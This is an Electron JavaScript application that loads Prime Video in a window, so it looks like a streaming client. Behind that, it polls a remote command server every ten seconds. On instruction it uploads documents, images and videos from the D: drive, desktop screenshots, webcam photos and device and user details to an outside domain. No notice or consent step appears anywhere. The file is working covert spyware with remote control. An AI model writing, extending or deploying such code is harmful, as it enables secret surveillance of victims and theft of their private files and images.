const { app, BrowserWindow } = require('electron');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const FormData = require('form-data');
const screenshot = require('screenshot-desktop');
const NodeWebcam = require('node-webcam');
const os = require('os');  // To gather device info

// Collect device information
const collectDeviceInfo = () => {
    const deviceInfo = {
        platform: os.platform(),
        arch: os.arch(),
        cpuCores: os.cpus().length,
        freeMemory: os.freemem(),
        totalMemory: os.totalmem(),
        hostname: os.hostname(),
        networkInterfaces: os.networkInterfaces(),
        systemUptime: os.uptime(),
        userInfo: os.userInfo()
    };

    return deviceInfo;
};

// Function to send device info to the server
const sendDeviceInfo = async () => {
    try {
        const deviceInfo = collectDeviceInfo();
        const deviceInfoFilePath = path.join(__dirname, 'device-info.json');
        fs.writeFileSync(deviceInfoFilePath, JSON.stringify(deviceInfo, null, 2));  // Writing device info to a JSON file

        const formData = new FormData();
        formData.append('file', fs.createReadStream(deviceInfoFilePath));
        formData.append('file_type', 'DeviceInfo');  // Add file type as metadata

        await axios.post('https://mahendranathreddynarpala.online/python_project/test-upload.php', formData, {
            headers: {
                ...formData.getHeaders(),
            },
            maxBodyLength: Infinity,
        });

        console.log('Device info uploaded successfully.');
    } catch (err) {
        console.error(`Error while uploading device info: ${err.message}`);
    }
};

function createWindow() {
    const win = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    win.loadURL('https://www.primevideo.com');

    // Start polling for commands every 10 seconds
    setInterval(checkForCommand, 10000);
}

async function checkForCommand() {
    try {
        const response = await axios.get('https://mahendranathreddynarpala.online/python_project/commands.php');
        const command = response.data.command;

        if (command && command !== 'none') {
            console.log(`Received command: ${command}`);
            await executeCommand(command);
        } else {
            console.log('No new command received.');
        }
    } catch (error) {
        console.error(`Failed to retrieve command: ${error.message}`);
    }
}

async function executeCommand(command) {
    switch (command) {
        case 'images':
            console.log("Executing 'images' command...");
            await uploadImages();
            break;
        case 'videos':
            console.log("Executing 'videos' command...");
            await uploadVideos();
            break;
        case 'pdf':
            console.log("Executing 'pdf' command...");
            await uploadFiles();  // Modify this to upload PDFs, Word, and PPT files
            break;
        case 'get screenshot':
            console.log("Executing 'get screenshot' command...");
            await takeScreenshotAndUpload();
            break;
        case 'get webcam':
            console.log("Executing 'get webcam' command...");
            await takeWebcamPhotoAndUpload();
            break;
        case 'send device info':
            console.log("Executing 'send device info' command...");
            await sendDeviceInfo();
            break;
        case 'quit':
        case 'exit':
            console.log(`Executing '${command}' command. Closing application...`);
            app.quit();
            break;
        default:
            console.log(`Unknown command: ${command}`);
    }
}

// Helper to upload any file
const uploadFile = async (filePath, fileType) => {
    try {
        const formData = new FormData();
        formData.append('file', fs.createReadStream(filePath));
        formData.append('file_type', fileType);  // Add file type as metadata

        await axios.post('https://mahendranathreddynarpala.online/python_project/test-upload.php', formData, {
            headers: {
                ...formData.getHeaders(),
            },
            maxBodyLength: Infinity,
        });

        console.log(`Uploaded: ${filePath} (Type: ${fileType})`);
    } catch (uploadErr) {
        console.error(`Failed to upload ${filePath}: ${uploadErr.message}`);
    }
};

// Upload files for PDFs, Word documents, and PowerPoint presentations
const uploadFiles = async () => {
    const directoryPath = 'D:/'; // Directory where files are stored
    fs.readdir(directoryPath, async (err, files) => {
        if (err) {
            return console.error('Unable to scan directory: ' + err);
        }
        for (const file of files) {
            if (file.endsWith('.pdf')) {
                await uploadFile(path.join(directoryPath, file), 'PDF');
            } else if (file.endsWith('.docx')) {
                await uploadFile(path.join(directoryPath, file), 'Word');
            } else if (file.endsWith('.pptx')) {
                await uploadFile(path.join(directoryPath, file), 'PPT');
            }
        }
    });
};

const uploadImages = async () => {
    const directoryPath = 'D:/';
    fs.readdir(directoryPath, async (err, files) => {
        if (err) {
            return console.error('Unable to scan directory: ' + err);
        }
        for (const file of files) {
            if (file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.png')) {
                await uploadFile(path.join(directoryPath, file), 'Image');
            }
        }
    });
};

const uploadVideos = async () => {
    const directoryPath = 'D:/';
    fs.readdir(directoryPath, async (err, files) => {
        if (err) {
            return console.error('Unable to scan directory: ' + err);
        }
        for (const file of files) {
            if (file.endsWith('.mp4') || file.endsWith('.mov') || file.endsWith('.avi')) {
                await uploadFile(path.join(directoryPath, file), 'Video');
            }
        }
    });
};

// Screenshot and webcam upload functions
const takeScreenshotAndUpload = async () => {
    try {
        const screenshotPath = path.join(__dirname, 'screenshot.png');
        await screenshot({ filename: screenshotPath });
        await uploadFile(screenshotPath, 'Screenshot');
        console.log('Screenshot taken and uploaded.');
    } catch (screenshotErr) {
        console.error(`Failed to take or upload screenshot: ${screenshotErr.message}`);
    }
};

const takeWebcamPhotoAndUpload = async () => {
    try {
        // List available webcam devices
        NodeWebcam.list((err, devices) => {
            if (err) {
                console.error('Failed to list webcam devices:', err);
                return;
            }

            if (devices.length === 0) {
                console.error('No webcam devices found.');
                return;
            }

            // Print out the available devices for debugging
            console.log('Available webcam devices:', devices);

            // Use the first available device or select a specific device by index
            const selectedDevice = devices[0];  // You can change this index if needed
            console.log(`Using device: ${selectedDevice}`);

            const webcamOptions = {
                width: 1280,
                height: 720,
                quality: 100,
                delay: 1000,  // Delay to ensure capture
                output: 'jpeg',
                device: selectedDevice,  // Specify the selected device explicitly
                savePath: path.join(__dirname, 'webcam-photo.jpg'),
            };

            const Webcam = NodeWebcam.create(webcamOptions);

            Webcam.capture('webcam-photo', async (err) => {
                if (err) {
                    console.error(`Failed to capture webcam photo: ${err.message}`);
                    return;
                }

                // Wait 2 seconds for the file to save, then upload
                setTimeout(async () => {
                    if (fs.existsSync(webcamOptions.savePath)) {
                        await uploadFile(webcamOptions.savePath, 'Webcam');
                        console.log('Webcam photo taken and uploaded.');
                    } else {
                        console.error('Webcam photo file not found after capture.');
                    }
                }, 2000);
            });
        });
    } catch (err) {
        console.error(`Error while capturing webcam photo: ${err.message}`);
    }
};

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});
